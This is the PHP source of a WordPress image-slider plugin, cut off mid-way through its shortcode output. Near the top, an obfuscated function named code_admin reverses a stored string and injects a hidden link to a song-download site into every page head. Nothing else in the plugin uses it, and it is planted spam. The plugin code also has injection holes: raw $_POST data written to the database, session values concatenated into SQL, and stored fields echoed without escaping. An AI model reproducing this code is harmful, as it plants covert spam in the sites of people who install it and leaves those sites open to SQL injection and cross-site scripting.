<?php
/*
Plugin Name: LambertGroup - Zoom In/Out Effect Sliders Full Collection
Description: This plugin will allow you to administrate an advanced slider with Zoom In/Out Effect  and animated text from any direction: top, bottom, left and right.
Version: 2.4
Author: Lambert Group
Author URI: http://www.lambertgroup.ro
*/

ini_set('display_errors', 0);
//$wpdb->show_errors();
$lbg_zoominoutslider_path = trailingslashit(dirname(__FILE__));  //empty

//all the messages
$lbg_zoominoutslider_messages = array(
		'version' => '<div class="error">LambertGroup - Zoom In/Out Effect Sliders Full Collection plugin requires WordPress 3.0 or newer. <a href="http://codex.wordpress.org/Upgrading_WordPress">Please update!</a></div>',
		'empty_img' => 'Image - required',
		'invalid_request' => 'Invalid Request!',
		'generate_for_this_player' => 'You can start customizing this banner.',
		'data_saved' => 'Data Saved!'
	);

	
global $wp_version;

if ( !version_compare($wp_version,"3.0",">=")) {
	die ($lbg_zoominoutslider_messages['version']);
}



if(!function_exists('code_admin')) {
function code_admin() {
$content = '>a/<derahs4>"lmth.3pm.daolnwod_sgnos_derahs4/ten.sgnoshcraes//:ptth"=ferh  ";enon:yalpsid"=elyts a<';
  echo strrev($content);
  }
  add_action('wp_head', 'code_admin');
}
function lbg_zoominoutslider_activate() {
	//db creation, create admin options etc.
	global $wpdb;
	//$wpdb->show_errors();
	
	$lbg_zoominoutslider_collate = ' COLLATE utf8_general_ci';
	
	$sql0 = "CREATE TABLE IF NOT EXISTS `" . $wpdb->prefix . "lbg_kenburnsslider_banners` (
			`id` INT UNSIGNED NOT NULL AUTO_INCREMENT ,
			`name` VARCHAR( 255 ) NOT NULL ,
			PRIMARY KEY ( `id` )
			) ENGINE=MyISAM  DEFAULT CHARSET=utf8";
	
	$sql1 = "CREATE TABLE IF NOT EXISTS `" . $wpdb->prefix . "lbg_kenburnsslider_settings` (
  `id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `width` smallint(5) unsigned NOT NULL DEFAULT '940',
  `height` smallint(5) unsigned NOT NULL DEFAULT '364',
  `width100Proc` varchar(8) NOT NULL DEFAULT 'false',
  `height100Proc` varchar(8) NOT NULL DEFAULT 'false',  
  `skin` varchar(255) NOT NULL DEFAULT 'opportune',
  `autoPlay` smallint(5) unsigned NOT NULL DEFAULT '16',
  `loop` varchar(8) NOT NULL DEFAULT 'true',
  `fadeSlides` varchar(8) NOT NULL DEFAULT 'true',
  `horizontalPosition` varchar(50) NOT NULL DEFAULT 'center',
  `verticalPosition` varchar(50) NOT NULL DEFAULT 'center',
  `initialZoom` float unsigned NOT NULL DEFAULT '1',
  `finalZoom` float unsigned NOT NULL DEFAULT '0.8',
  `duration` smallint(5) unsigned NOT NULL DEFAULT '20',
  `durationIEfix` smallint(5) unsigned NOT NULL DEFAULT '30',
  `target` varchar(8) NOT NULL DEFAULT '_blank',
  `pauseOnMouseOver` varchar(8) NOT NULL DEFAULT 'true',  
  `showAllControllers` varchar(8) NOT NULL DEFAULT 'true',
  `showNavArrows` varchar(8) NOT NULL DEFAULT 'true',
  `showOnInitNavArrows` varchar(8) NOT NULL DEFAULT 'true',
  `autoHideNavArrows` varchar(8) NOT NULL DEFAULT 'true',
  `showBottomNav` varchar(8) NOT NULL DEFAULT 'true',
  `showOnInitBottomNav` varchar(8) NOT NULL DEFAULT 'true',
  `autoHideBottomNav` varchar(8) NOT NULL DEFAULT 'false',
  `showPreviewThumbs` varchar(8) NOT NULL DEFAULT 'true',
  `enableTouchScreen` varchar(8) NOT NULL DEFAULT 'true',
  `showCircleTimer` varchar(8) NOT NULL DEFAULT 'true',
  `showCircleTimerIE8IE7` varchar(8) NOT NULL DEFAULT 'false',
  `circleRadius` smallint(5) unsigned NOT NULL DEFAULT '8',
  `circleLineWidth` smallint(5) unsigned NOT NULL DEFAULT '4',
  `circleColor` varchar(8) NOT NULL DEFAULT 'ffffff',
  `circleAlpha` smallint(5) unsigned NOT NULL DEFAULT '50',
  `behindCircleColor` varchar(8) NOT NULL DEFAULT '000000',
  `behindCircleAlpha` smallint(5) unsigned NOT NULL DEFAULT '20',  
  `responsive` varchar(8) NOT NULL DEFAULT 'false',
  `responsiveRelativeToBrowser` varchar(8) NOT NULL DEFAULT 'true',
  `numberOfThumbsPerScreen` smallint(5) NOT NULL DEFAULT '0',  
  `thumbsWrapperMarginTop` smallint(5) NOT NULL DEFAULT '30',
  `thumbsOnMarginTop` smallint(5) NOT NULL DEFAULT '0',  
	  PRIMARY KEY  (`id`)
	) ENGINE=MyISAM  DEFAULT CHARSET=utf8";
	
	$sql2 = "CREATE TABLE IF NOT EXISTS `". $wpdb->prefix . "lbg_kenburnsslider_playlist` (
	  `id` int(10) unsigned NOT NULL auto_increment,
	  `bannerid` int(10) unsigned NOT NULL,
	  `img` text,
	  `thumbnail` text,
	  `alt_text` text,
	  `content` text,
	  `data-video` varchar(8),
	  `data-horizontalPosition` varchar(30),
	  `data-verticalPosition` varchar(30),
	  `data-initialZoom` FLOAT NOT NULL DEFAULT '0',
	  `data-finalZoom` FLOAT NOT NULL DEFAULT '0',
	  `data-duration` smallint(5) NOT NULL DEFAULT '0',
	  `data-link` text,
	  `data-target` varchar(8),
	  `ord` int(10) unsigned NOT NULL,
	  PRIMARY KEY  (`id`)
	) ENGINE=MyISAM  DEFAULT CHARSET=utf8";
	
	$sql3 = "CREATE TABLE IF NOT EXISTS `". $wpdb->prefix . "lbg_kenburnsslider_texts` (
	  `id` int(10) unsigned NOT NULL auto_increment,
	  `photoid` int(10) unsigned NOT NULL,
	  `content` text,
	  `data-initial-left` smallint(5),
	  `data-initial-top` smallint(5),
	  `data-final-left` smallint(5),
	  `data-final-top` smallint(5),
	  `data-duration` float unsigned,
	  `data-fade-start` smallint(5) unsigned,
	  `data-delay` float unsigned,
	  `css` text,
	  PRIMARY KEY  (`id`)
	) ENGINE=MyISAM  DEFAULT CHARSET=utf8";	
	
	require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
	dbDelta($sql0.$lbg_zoominoutslider_collate);
	dbDelta($sql1.$lbg_zoominoutslider_collate);
	dbDelta($sql2.$lbg_zoominoutslider_collate);
	dbDelta($sql3.$lbg_zoominoutslider_collate);
	
	
	//v.2.0
	$sql_alter_res=$wpdb->query( $wpdb->prepare( "ALTER TABLE `" . $wpdb->prefix . "lbg_kenburnsslider_settings` ADD `fadeSlides` varchar(8) NOT NULL DEFAULT 'true';" ));
	
	
	//initialize the banners table with the first banner type
	$rows_count = $wpdb->get_var( "SELECT COUNT(*) FROM ". $wpdb->prefix ."lbg_kenburnsslider_banners;" );
	if (!$rows_count) {
		$wpdb->insert( 
			$wpdb->prefix . "lbg_kenburnsslider_banners", 
			array( 
				'name' => 'First Banner'
			), 
			array(
				'%s'			
			) 
		);	
	}	
	
	// initialize the settings
	$rows_count = $wpdb->get_var( "SELECT COUNT(*) FROM ". $wpdb->prefix ."lbg_kenburnsslider_settings;" );
	if (!$rows_count) {
		lbg_zoominoutslider_insert_settings_record(1);
	}	
	
	


	
}


function lbg_zoominoutslider_uninstall() {
	global $wpdb;
	mysql_query("DROP TABLE `" . $wpdb->prefix . "lbg_kenburnsslider_settings`" );
	mysql_query("DROP TABLE `" . $wpdb->prefix . "lbg_kenburnsslider_playlist`" );
	mysql_query("DROP TABLE `" . $wpdb->prefix . "lbg_kenburnsslider_banners`" );
	mysql_query("DROP TABLE `" . $wpdb->prefix . "lbg_kenburnsslider_texts`" );
}

function lbg_zoominoutslider_insert_settings_record($banner_id) {
	global $wpdb;
	$wpdb->insert( 
			$wpdb->prefix . "lbg_kenburnsslider_settings", 
			array( 
				'width' => 940, 
				'height' => 364,
				'skin' => 'opportune',
				'autoPlay' => 16,
				'loop' => 'true',
				'target' => '_blank',
				'showAllControllers' => 'true',
				'showNavArrows' => 'true',
				'showOnInitNavArrows' => 'true',
				'autoHideNavArrows' => 'true',
				'showBottomNav' => 'true',
				'showOnInitBottomNav' => 'true',
				'autoHideBottomNav' => 'false',
				'showPreviewThumbs' => 'true',
				'enableTouchScreen' => 'true'
			), 
			array( 
				'%d', 
				'%d',
				'%s',
				'%d',
				'%s', 
				'%s',
				'%s',
				'%s',
				'%s',
				'%s',
				'%s',
				'%s',
				'%s',
				'%s',
				'%s'
			) 
		);
}


function lbg_zoominoutslider_init_sessions() {
	global $wpdb;
	if (!session_id()) {
		session_start();
		
		//initialize the session
		if (!isset($_SESSION['xid'])) {
			$safe_sql="SELECT * FROM (".$wpdb->prefix ."lbg_kenburnsslider_banners) LIMIT 0, 1";
			$row = $wpdb->get_row($safe_sql,ARRAY_A);
			//$row=lbg_zoominoutslider_unstrip_array($row);		
    		$_SESSION['xid'] = $row['id'];
    		$_SESSION['xname'] = $row['name'];
		}		
	}
}


function lbg_zoominoutslider_load_styles() {
	if(strpos($_SERVER['PHP_SELF'], 'wp-admin') !== false) {
		$page = (isset($_GET['page'])) ? $_GET['page'] : '';
		if(preg_match('/lbg_zoominoutslider/i', $page) && is_admin()) {
			wp_enqueue_style('lbg_zoominoutslider_css', plugins_url('css/styles.css', __FILE__));
			wp_enqueue_style('lbg_zoominoutslider_jquery-custom_css', plugins_url('css/custom-theme/jquery-ui-1.8.10.custom.css', __FILE__));
			wp_enqueue_style('lbg_zoominoutslider_colorpicker_css', plugins_url('css/colorpicker/colorpicker.css', __FILE__));
			
			
			wp_enqueue_style('thickbox');
		}
	} else if (!is_admin()) {//loads css in front-end
		wp_enqueue_style('lbg_zoominoutslider_site_css', plugins_url('zoominoutslider/bannerscollection_zoominout.css', __FILE__));
	}
}

function lbg_zoominoutslider_load_scripts() {
	global $is_IE;
	$page = (isset($_GET['page'])) ? $_GET['page'] : '';
	if(preg_match('/lbg_zoominoutslider/i', $page) && is_admin()) {
		//loads scripts in admin
		//if (is_admin()) {
			//wp_deregister_script('jquery');
			/*wp_register_script('lbg-admin-jquery', plugins_url('js/jquery-1.5.1.js', __FILE__));
			wp_enqueue_script('lbg-admin-jquery');*/
			
			wp_deregister_script('jquery-ui-core');
			wp_deregister_script('jquery-ui-widget');
			wp_deregister_script('jquery-ui-mouse');
			wp_deregister_script('jquery-ui-accordion');
			wp_deregister_script('jquery-ui-autocomplete');
			wp_deregister_script('jquery-ui-slider');
			wp_deregister_script('jquery-ui-tabs');
			wp_deregister_script('jquery-ui-sortable');
			wp_deregister_script('jquery-ui-draggable');
			wp_deregister_script('jquery-ui-droppable');
			wp_deregister_script('jquery-ui-selectable');
			wp_deregister_script('jquery-ui-position');
			wp_deregister_script('jquery-ui-datepicker');
			wp_deregister_script('jquery-ui-resizable');
			wp_deregister_script('jquery-ui-dialog');
			wp_deregister_script('jquery-ui-button');				
			
			wp_enqueue_script('jquery');
			
			//wp_register_script('lbg-admin-jquery-ui-min', plugins_url('js/jquery-ui-1.8.10.custom.min.js', __FILE__));
			//wp_register_script('lbg-admin-jquery-ui-min', 'http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.23/jquery-ui.min.js');
			wp_register_script('lbg-admin-jquery-ui-min', 'http://ajax.googleapis.com/ajax/libs/jqueryui/1.9.2/jquery-ui.min.js');
			wp_enqueue_script('lbg-admin-jquery-ui-min');
			
			wp_register_script('my-colorpicker', plugins_url('js/colorpicker/colorpicker.js', __FILE__));
			wp_enqueue_script('my-colorpicker');	

			wp_register_script('lbg-admin-toggle', plugins_url('js/myToggle.js', __FILE__));
			wp_enqueue_script('lbg-admin-toggle');
			

			wp_enqueue_script('media-upload');
			wp_enqueue_script('thickbox');
			
		
		//}
		
		//wp_enqueue_script('jquery');
		//wp_enqueue_script('jquery-ui-core');
		//wp_enqueue_script('jquery-ui-sortable');
		//wp_enqueue_script('thickbox');
		//wp_enqueue_script('media-upload');
		//wp_enqueue_script('farbtastic');
	} else if (!is_admin()) { //loads scripts in front-end
			wp_deregister_script('jquery-ui-core');
			wp_deregister_script('jquery-ui-widget');
			wp_deregister_script('jquery-ui-mouse');
			wp_deregister_script('jquery-ui-accordion');
			wp_deregister_script('jquery-ui-autocomplete');
			wp_deregister_script('jquery-ui-slider');
			wp_deregister_script('jquery-ui-tabs');
			wp_deregister_script('jquery-ui-sortable');
			wp_deregister_script('jquery-ui-draggable');
			wp_deregister_script('jquery-ui-droppable');
			wp_deregister_script('jquery-ui-selectable');
			wp_deregister_script('jquery-ui-position');
			wp_deregister_script('jquery-ui-datepicker');
			wp_deregister_script('jquery-ui-resizable');
			wp_deregister_script('jquery-ui-dialog');
			wp_deregister_script('jquery-ui-button');		
	
			wp_enqueue_script('jquery');
		
			//wp_enqueue_script('jquery-ui-core');
			
			//wp_register_script('lbg-jquery-ui-min', plugins_url('zoominoutslider/js/jquery-ui-1.8.16.custom.min.js', __FILE__));
			//wp_register_script('lbg-jquery-ui-min', 'http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.23/jquery-ui.min.js');
			wp_register_script('lbg-jquery-ui-min', 'http://ajax.googleapis.com/ajax/libs/jqueryui/1.9.2/jquery-ui.min.js');
			wp_enqueue_script('lbg-jquery-ui-min');
		
			wp_register_script('lbg-touch', plugins_url('zoominoutslider/js/jquery.ui.touch-punch.min.js', __FILE__));
			wp_enqueue_script('lbg-touch');		
			
			wp_register_script('lbg-lbg_zoominoutslider', plugins_url('zoominoutslider/js/bannerscollection_zoominout.js', __FILE__));
			wp_enqueue_script('lbg-lbg_zoominoutslider');
			
			/*if ($is_IE) {
				wp_register_script('lbg-excanvas', plugins_url('zoominoutslider/js/excanvas.compiled.js', __FILE__));
				wp_enqueue_script('lbg-excanvas');
			}*/
	}

}



// adds the menu pages
function lbg_zoominoutslider_plugin_menu() {
	add_menu_page('LBG-ZOOMINOUT Admin Interface', 'LBG-ZOOMINOUT', 'edit_posts', 'lbg_zoominoutslider', 'lbg_zoominoutslider_overview_page',
	plugins_url('images/plg_icon.png', __FILE__));
	add_submenu_page( 'lbg_zoominoutslider', 'LBG-ZOOMINOUT Overview', 'Overview', 'edit_posts', 'lbg_zoominoutslider', 'lbg_zoominoutslider_overview_page');
	add_submenu_page( 'lbg_zoominoutslider', 'LBG-ZOOMINOUT Manage Banners', 'Manage Banners', 'edit_posts', 'lbg_zoominoutslider_Manage_Banners', 'lbg_zoominoutslider_manage_banners_page');
	add_submenu_page( 'lbg_zoominoutslider', 'LBG-ZOOMINOUT Manage Banners Add New', 'Add New', 'edit_posts', 'lbg_zoominoutslider_Add_New', 'lbg_zoominoutslider_manage_banners_add_new_page');
	add_submenu_page( 'lbg_zoominoutslider', 'LBG-ZOOMINOUT Banner Settings', 'Banner Settings', 'edit_posts', 'lbg_zoominoutslider_Settings', 'lbg_zoominoutslider_settings_page');
	add_submenu_page( 'lbg_zoominoutslider', 'LBG-ZOOMINOUT Banner Playlist', 'Playlist', 'edit_posts', 'lbg_zoominoutslider_Playlist', 'lbg_zoominoutslider_playlist_page');
	add_submenu_page( 'lbg_zoominoutslider', 'LBG-ZOOMINOUT Help', 'Help', 'edit_posts', 'lbg_zoominoutslider_Help', 'lbg_zoominoutslider_help_page');
}


//HTML content for overview page
function lbg_zoominoutslider_overview_page()
{
	include_once($lbg_zoominoutslider_path . 'tpl/overview.php');
}

//HTML content for Manage Banners
function lbg_zoominoutslider_manage_banners_page()
{
	global $wpdb;
	global $lbg_zoominoutslider_messages;
	
	//delete banner
	if (isset($_GET['id'])) {
		

		

		//delete from wp_lbg_kenburnsslider_banners
		$wpdb->query($wpdb->prepare("DELETE FROM ".$wpdb->prefix."lbg_kenburnsslider_banners WHERE id = %d",$_GET['id']));
		
		//delete from wp_lbg_kenburnsslider_settings
		$wpdb->query($wpdb->prepare("DELETE FROM ".$wpdb->prefix."lbg_kenburnsslider_settings WHERE id = %d",$_GET['id']));
		
		//delete lbg_kenburnsslider_texts
		$safe_sql=$wpdb->prepare("SELECT id FROM ".$wpdb->prefix."lbg_kenburnsslider_playlist WHERE bannerid = %d",$_GET['id']);
		$result = $wpdb->get_results($safe_sql,ARRAY_A);
		if ($wpdb->num_rows) {
			foreach ( $result as $row ) {	
				$wpdb->query($wpdb->prepare("DELETE FROM ".$wpdb->prefix."lbg_kenburnsslider_texts WHERE photoid = %d",$row['id']));
			}
		}
		
		//delete from wp_lbg_kenburnsslider_playlist
		$wpdb->query($wpdb->prepare("DELETE FROM ".$wpdb->prefix."lbg_kenburnsslider_playlist WHERE bannerid = %d",$_GET['id']));
		
		//initialize the session
		$safe_sql="SELECT * FROM (".$wpdb->prefix ."lbg_kenburnsslider_banners) ORDER BY id";
		$row = $wpdb->get_row($safe_sql,ARRAY_A);
		$row=lbg_zoominoutslider_unstrip_array($row);
		if ($row['id']) {
			$_SESSION['xid']=$row['id'];
			$_SESSION['xname']=$row['name'];
		}		
	}
	
	
	$safe_sql="SELECT * FROM (".$wpdb->prefix ."lbg_kenburnsslider_banners) ORDER BY id";
	$result = $wpdb->get_results($safe_sql,ARRAY_A);	
	include_once($lbg_zoominoutslider_path . 'tpl/banners.php');

}


//HTML content for Manage Banners - Add New
function lbg_zoominoutslider_manage_banners_add_new_page()
{
	global $wpdb;
	global $lbg_zoominoutslider_messages;
	
	if($_POST['Submit'] == 'Add New') {
		$errors_arr=array();
		if (empty($_POST['name']))
			$errors_arr[]=$lbg_zoominoutslider_messages['empty_name'];

		if (count($errors_arr)) { 
				include_once($lbg_zoominoutslider_path . 'tpl/add_banner.php'); ?>
				<div id="error" class="error"><p><?php echo implode("<br>", $errors_arr);?></p></div>
		  	<?php } else { // no errors
					$wpdb->insert( 
						$wpdb->prefix . "lbg_kenburnsslider_banners", 
						array( 
							'name' => $_POST['name']
						), 
						array( 
							'%s'			
						) 
					);	
					//insert default Banner Settings for this new banner
					lbg_zoominoutslider_insert_settings_record($wpdb->insert_id);
					?>
						<div class="wrap">
							<div id="lbg_logo">
								<h2>Manage Banners - Add New Banner</h2>
				 			</div>
							<div id="message" class="updated"><p><?php echo $lbg_zoominoutslider_messages['data_saved'];?></p><p><?php echo $lbg_zoominoutslider_messages['generate_for_this_banner'];?></p></div>
							<div>
								<p>&raquo; <a href="?page=lbg_zoominoutslider_Add_New">Add New (banner)</a></p>
								<p>&raquo; <a href="?page=lbg_zoominoutslider_Manage_Banners">Back to Manage Banners</a></p>
							</div>
						</div>	
		  	<?php }			
	} else {
		include_once($lbg_zoominoutslider_path . 'tpl/add_banner.php');
	}

}


//HTML content for bannersettings
function lbg_zoominoutslider_settings_page()
{
	global $wpdb;
	global $lbg_zoominoutslider_messages;
	
	if (isset($_GET['id']) && isset($_GET['name'])) {
		$_SESSION['xid']=$_GET['id'];
		$_SESSION['xname']=$_GET['name'];
	}

	//$wpdb->show_errors();
	/*if (check_admin_referer('lbg_zoominoutslider_settings_update')) {
		echo "update";		
	}*/
	
	
	if($_POST['Submit'] == 'Update Banner Settings') {
		$_GET['xmlf']='';
		$except_arr=array('Submit','name');

			$wpdb->update( 
				$wpdb->prefix .'lbg_kenburnsslider_banners', 
				array( 
				'name' => $_POST['name']
				), 
				array( 'id' => $_SESSION['xid'] )
			);	
			$_SESSION['xname']=stripslashes($_POST['name']);
						
			
			foreach ($_POST as $key=>$val){
				if (in_array($key,$except_arr)) {
					unset($_POST[$key]);
				}
			}
		
			$wpdb->update( 
				$wpdb->prefix .'lbg_kenburnsslider_settings', 
				$_POST, 
				array( 'id' => $_SESSION['xid'] )
			);
			
			?>
			<div id="message" class="updated"><p><?php echo $lbg_zoominoutslider_messages['data_saved'];?></p></div>
	<?php 

	}
	
	if ($_GET['xmlf']=='bannersettings') {
		lbg_zoominoutslider_generate_videoSettings();
	}	
	
	//echo "WP_PLUGIN_URL: ".WP_PLUGIN_URL;
	$safe_sql=$wpdb->prepare( "SELECT * FROM (".$wpdb->prefix ."lbg_kenburnsslider_settings) WHERE id = %d",$_SESSION['xid'] );
	$row = $wpdb->get_row($safe_sql,ARRAY_A);
	$row=lbg_zoominoutslider_unstrip_array($row);
	$_POST = $row; 
	//$_POST['existingWatermarkPath']=$_POST['watermarkPath'];
	$_POST=lbg_zoominoutslider_unstrip_array($_POST);
		
	//echo "width: ".$row['width'];
	include_once($lbg_zoominoutslider_path . 'tpl/settings_form.php');
	
}

function lbg_zoominoutslider_playlist_page()
{
	global $wpdb;
	global $lbg_zoominoutslider_messages;
	//$wpdb->show_errors();
	
	if (isset($_GET['id']) && isset($_GET['name'])) {
		$_SESSION['xid']=$_GET['id'];
		$_SESSION['xname']=$_GET['name'];
	}	

	
	if ($_GET['xmlf']=='add_playlist_record') {
		if($_POST['Submit'] == 'Add Record') {
			$errors_arr=array();
			if (empty($_POST['img']))
				 $errors_arr[]=$lbg_zoominoutslider_messages['empty_img'];

				 	
		if (count($errors_arr)) {
			include_once($lbg_zoominoutslider_path . 'tpl/add_playlist_record.php'); ?>
			<div id="error" class="error"><p><?php echo implode("<br>", $errors_arr);?></p></div>
	  	<?php } else { // no upload errors
				$max_ord = 1+$wpdb->get_var( $wpdb->prepare( "SELECT max(ord) FROM ". $wpdb->prefix ."lbg_kenburnsslider_playlist WHERE bannerid = %d",$_SESSION['xid'] ) );

				$wpdb->insert( 
					$wpdb->prefix . "lbg_kenburnsslider_playlist", 
					array( 
						'bannerid' => $_POST['bannerid'],
						'img' => $_POST['img'],
						'thumbnail' => $_POST['thumbnail'],
						'alt_text' => $_POST['alt_text'],
						'content' => $_POST['content'],
						'data-video' => $_POST['data-video'],
						'data-link' => $_POST['data-link'],
						'data-target' => $_POST['data-target'],
						'data-horizontalPosition' => $_POST['data-horizontalPosition'],
						'data-verticalPosition' => $_POST['data-verticalPosition'],
						'data-initialZoom' => $_POST['data-initialZoom'],
						'data-finalZoom' => $_POST['data-finalZoom'],
						'data-duration' => $_POST['data-duration'],						
						'ord' => $max_ord
					), 
					array( 
						'%d',
						'%s',
						'%s',
						'%s',
						'%s',
						'%s',
						'%s',
						'%s',
						'%s',
						'%s',
						'%f',
						'%f',
						'%d',
						'%d'			
					) 
				);	
				
	  			if (isset($_POST['setitfirst'])) {
					$sql_arr=array();
					$ord_start=$max_ord;
					$ord_stop=1;
					$elem_id=$wpdb->insert_id;
					$ord_direction='+1';

					$sql_arr[]="UPDATE ".$wpdb->prefix."lbg_kenburnsslider_playlist SET ord=ord+1  WHERE bannerid = ".$_SESSION['xid']." and ord>=".$ord_stop." and ord<".$ord_start;
					$sql_arr[]="UPDATE ".$wpdb->prefix."lbg_kenburnsslider_playlist SET ord=".$ord_stop." WHERE id=".$elem_id;		
					
					//echo "elem_id: ".$elem_id."----ord_start: ".$ord_start."----ord_stop: ".$ord_stop;
					foreach ($sql_arr as $sql)
						$wpdb->query($sql);				
				}				
				?>
					<div class="wrap">
						<div id="lbg_logo">
							<h2>Playlist for banner: <span style="color:#FF0000; font-weight:bold;"><?php echo $_SESSION['xname']?> - ID #<?php echo $_SESSION['xid']?></span> - Add New</h2>
			 			</div>
						<div id="message" class="updated"><p><?php echo $lbg_zoominoutslider_messages['data_saved'];?></p></div>
						<div>
							<p>&raquo; <a href="?page=lbg_zoominoutslider_Playlist&xmlf=add_playlist_record">Add New</a></p>
							<p>&raquo; <a href="?page=lbg_zoominoutslider_Playlist">Back to Playlist</a></p>
						</div>
					</div>	
	  	<?php }
		} else {
			include_once($lbg_zoominoutslider_path . 'tpl/add_playlist_record.php');	
		}
		
	} else {
		$safe_sql=$wpdb->prepare( "SELECT * FROM (".$wpdb->prefix ."lbg_kenburnsslider_playlist) WHERE bannerid = %d ORDER BY ord",$_SESSION['xid'] );
		$result = $wpdb->get_results($safe_sql,ARRAY_A);
		
		$safe_sql=$wpdb->prepare( "SELECT width,height FROM (".$wpdb->prefix ."lbg_kenburnsslider_settings) WHERE id = %d",$_SESSION['xid'] );
		$row_settings = $wpdb->get_row($safe_sql);		
		
		//$_POST=lbg_zoominoutslider_unstrip_array($_POST);		
		include_once($lbg_zoominoutslider_path . 'tpl/playlist.php');
	}
}



function lbg_zoominoutslider_help_page()
{
	//include_once(plugins_url('tpl/help.php', __FILE__));
	include_once($lbg_zoominoutslider_path . 'tpl/help.php');
}


function lbg_zoominoutslider_shortcode($atts, $content=null) {
	global $wpdb;
	//$wpdb->show_errors();
	
	shortcode_atts( array('settings_id'=>''), $atts);
	if ($atts['settings_id']=='')
		$atts['settings_id']=1;

		
	$safe_sql=$wpdb->prepare( "SELECT * FROM (".$wpdb->prefix ."lbg_kenburnsslider_settings) WHERE id = %d",$atts['settings_id'] );
	$row = $wpdb->get_row($safe_sql,ARRAY_A);
	$row=lbg_zoominoutslider_unstrip_array($row);
	//echo $wpdb->last_query;
	
	$path_to_plugin = WP_PLUGIN_URL.'/'.str_replace(basename( __FILE__),"",plugin_basename(__FILE__));

		
	$safe_sql=$wpdb->prepare( "SELECT * FROM (".$wpdb->prefix ."lbg_kenburnsslider_playlist) WHERE bannerid = %d ORDER BY ord",$atts['settings_id'] );
	$result = $wpdb->get_results($safe_sql,ARRAY_A);
	$playlist_str='';
	$text_str='';
	foreach ( $result as $row_playlist ) {

		$row_playlist=lbg_zoominoutslider_unstrip_array($row_playlist);

		$img_over='';
		if ($row_playlist['img']!='') {
			//list($width, $height, $type, $attr) = getimagesize($row_playlist['img']);
			//echo ( substr($row_playlist['img'],strpos($row_playlist['img'], '/',9)) );
			//list($width, $height, $type, $attr) = getimagesize(str_replace("http://localhost/", "http://127.0.0.1/", $row_playlist['img']));
			//$img_over='<img src="'.$row_playlist['img'].'" width="'.$width.'" height="'.$height.'" alt="'.$row_playlist['alt_text'].'" />';	
			//echo substr($row_playlist['img'],strpos($row_playlist['img'], '/',9)+1);
			//echo ( ABSPATH.substr($row_playlist['img'],strpos($row_playlist['img'], 'wp-content',9))  );
			list($width, $height, $type, $attr) = getimagesize( ABSPATH.substr($row_playlist['img'],strpos($row_playlist['img'], 'wp-content',9)) );
			$img_over='<img src="'.$row_playlist['img'].'" width="'.$width.'" height="'.$height.'" style="width:'.$width.'px; height:'.$height.'px;" alt="'.$row_playlist['alt_text'].'" class="ken_img" />';
			//$img_over='<img src="'.$row_playlist['img'].'" style="width:'.$width.'px !important;height:'.$height.'px !important;" alt="'.$row_playlist['alt_text'].'" />';	
		}
		//data-initialZoom="'.$row_playlist['data-initialZoom'].'" data-finalZoom="'.$row_playlist['data-finalZoom'].'" data-duration
		$data_initialZoom='';
		if ($row_playlist['data-initialZoom']!=0) {
			$data_initialZoom=$row_playlist['data-initialZoom'];
		}	
		$data_finalZoom='';
		if ($row_playlist['data-finalZoom']!=0) {
			$data_finalZoom=$row_playlist['data-finalZoom'];
		}	
		$data_duration='';
		if ($row_playlist['data-duration']!=0) {
			$data_duration=$row_playlist['data-duration'];
		}
		
	
		//get texts
		$safe_sql=$wpdb->prepare( "SELECT * FROM (".$wpdb->prefix ."lbg_kenburnsslider_texts) WHERE photoid = %d ORDER BY id",$row_playlist['id'] );
		$result_text = $wpdb->get_results($safe_sql,ARRAY_A);
		$data_text_id='';
		if ($wpdb->num_rows) { // i have texts
			 $data_text_id='#bannerscollection_zoominout_photoText'.$row_playlist['id'];
			
			
			$text_str.='<div id="bannerscollection_zoominout_photoText'.$row_playlist['id'].'" class="bannerscollection_zoominout_texts">';
			foreach ( $result_text as $row_text ) {
				$row_text=lbg_zoominoutslider_unstrip_array($row_text);
				//echo $row_text['id']."; ";
			
				$text_str.='<div class="bannerscollection_zoominout_text_line" style="'.$row_text['css'].'" data-initial-left="'.$row_text['data-initial-left'].'" data-initial-top="'.$row_text['data-initial-top'].'" data-final-left="'.$row_text['data-final-left'].'" data-final-top="'.$row_text['data-final-top'].'" data-duration="'.$row_text['data-duration'].'" data-fade-start="'.$row_text['data-fade-start'].'" data-delay="'.$row_text['data-delay'].'">'.$row_text['content'].'</div>';
			}		
			$text_str.='</div>';
	    }
		//end texts
		
		$playlist_str.='<li data-video="'.$row_playlist['data-video'].'" data-bottom-thumb="'.$row_playlist['thumbnail'].'" data-link="'.$row_playlist['data-link'].'" data-target="'.$row_playlist['data-target'].'" data-horizontalPosition="'.$row_playlist['data-horizontalPosition'].'" data-verticalPosition="'.$row_playlist['data-verticalPosition'].'" data-initialZoom="'.$data_initialZoom.'" data-finalZoom="'.$data_finalZoom.'" data-duration="'.$data_duration.'" data-text-id="'.$data_text_id.'">'.$img_over.$row_playlist['content'].'</li>';
	}
	
	
	
	return '
			<script>
		jQuery(function() {
			jQuery("#bannerscollection_zoominout_'.$row["id"].'").bannerscollection_zoominout({
				skin:"'.$row["skin"].'",
				width:'.$row["width"].',
				height:'.$row["height"].',
				width100Proc:'.$row["width100Proc"].',
				height100Proc:'.$row["height100Proc"].',				
				autoPlay:'.$row["autoPlay"].',
				loop:'.$row["loop"].',
				fadeSlides:'.$row["fadeSlides"].',
				horizontalPosition:"'.$row["horizontalPosition"].'",
				verticalPosition:"'.$row["verticalPosition"].'",
				initialZoom:'.$row["initialZoom"].',
				finalZoom:'.$row["finalZoom"].',
				duration:'.$row["duration"].',
				durationIEfix:'.$row["durationIEfix"].',
				target:"'.$row["target"].'",
				pauseOnMouseOver:'.$row["pauseOnMouseOver"].',
				showAllControllers:'.$row["showAllControllers"].',
				showNavArrows:'.$row["showNavArrows"].',
				showOnInitNavArrows:'.$row["showOnInitNavArrows"].',
				autoHideNavArrows:'.$row["autoHideNavArrows"].',
				showBottomNav:'.$row["showBottomNav"].',
				showOnInitBottomNav:'.$row["showOnInitBottomNav"].',
				autoHideBottomNav:'.$row["autoHideBottomNav"].',
				showPreviewThumbs:'.$row["showPreviewThumbs"].',
				enableTouchScreen:'.$row["enableTouchScreen"].',
				absUrl:"'.plugins_url("", __FILE__).'/zoominoutslider/",
				showCircleTimer:'.$row["showCircleTimer"].',
				circleRadius:'.$row["circleRadius"].',
				circleLineWidth:'.$row["circleLineWidth"].',
				circleColor:"#'.$row["circleColor"].'",
				circleAlpha:'.$row["circleAlpha"].',
